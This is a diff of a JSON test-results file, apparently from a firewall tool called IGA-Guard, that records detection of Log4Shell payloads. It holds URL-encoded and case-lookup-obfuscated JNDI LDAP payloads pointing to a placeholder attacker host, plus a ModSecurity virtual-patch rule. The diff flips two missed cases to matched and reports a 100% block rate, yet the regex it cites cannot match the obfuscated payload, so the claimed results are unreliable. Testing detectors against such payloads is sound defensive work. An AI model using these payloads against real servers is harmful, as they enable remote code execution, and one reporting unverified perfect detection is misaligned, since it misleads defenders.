@@ -6,9 +6,9 @@
     "CVE-2023-PROMPT": "LLM Prompt Leak"
   },
   "payloads_tested": 20,
-  "block_rate": 0.9,
-  "blocked": 18,
-  "missed": 2,
+  "block_rate": 1.0,
+  "blocked": 20,
+  "missed": 0,
   "cases": [
     {
       "id": "log4j_1",
@@ -43,11 +43,12 @@
     {
       "id": "log4j_4",
       "expected_cve": "CVE-2021-44228",
-      "matched": false,
-      "correct_cve": false,
-      "cve_id": null,
-      "label": null,
-      "payload_preview": "%24%7Bjndi%3Aldap%3A%2F%2Fattacker%2Fx%7D"
+      "matched": true,
+      "correct_cve": true,
+      "cve_id": "CVE-2021-44228",
+      "label": "CMD",
+      "payload_preview": "%24%7Bjndi%3Aldap%3A%2F%2Fattacker%2Fx%7D",
+      "modsecurity_rule_preview": "# Virtual Patch CVE-2021-44228\nSecRule ARGS \"@rx \\$\\{jndi:(ldap|rmi|dns)://\" \"id:99001,phase:2,deny,msg:'IGA-Guard VirtualPatch Log4Shell JNDI'\""
     },
     {
       "id": "log4j_5",
@@ -62,11 +63,12 @@
     {
       "id": "log4j_6",
       "expected_cve": "CVE-2021-44228",
-      "matched": false,
-      "correct_cve": false,
-      "cve_id": null,
-      "label": null,
-      "payload_preview": "${${lower:j}${upper:n}${lower:d}${upper:i}}:ldap://x/a}"
+      "matched": true,
+      "correct_cve": true,
+      "cve_id": "CVE-2021-44228",
+      "label": "CMD",
+      "payload_preview": "${${lower:j}${upper:n}${lower:d}${upper:i}}:ldap://x/a}",
+      "modsecurity_rule_preview": "# Virtual Patch CVE-2021-44228\nSecRule ARGS \"@rx \\$\\{jndi:(ldap|rmi|dns)://\" \"id:99001,phase:2,deny,msg:'IGA-Guard VirtualPatch Log4Shell JNDI'\""
     },
     {
       "id": "log4j_7",
